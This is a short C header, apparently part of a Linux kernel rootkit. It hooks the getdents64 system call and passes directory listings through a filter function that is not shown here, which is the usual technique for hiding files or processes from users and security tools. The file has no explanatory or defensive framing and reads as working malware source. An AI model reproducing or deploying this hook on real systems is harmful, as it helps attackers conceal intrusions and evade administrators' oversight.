#ifndef _GETDENTS64_H_
#define _GETDENTS64_H_

static asmlinkage long (*og_getdents64)(unsigned int fd,
        struct linux_dirent64 __user *dirent, unsigned int count);

static asmlinkage long hooked_getdents64(unsigned int fd,
        struct linux_dirent64 __user *dirent, unsigned int count)
{
    long ret = og_getdents64(fd, dirent, count);
    if (ret <= 0)
        return ret;
    return filter_dirents(dirent, ret, true);
}

#endif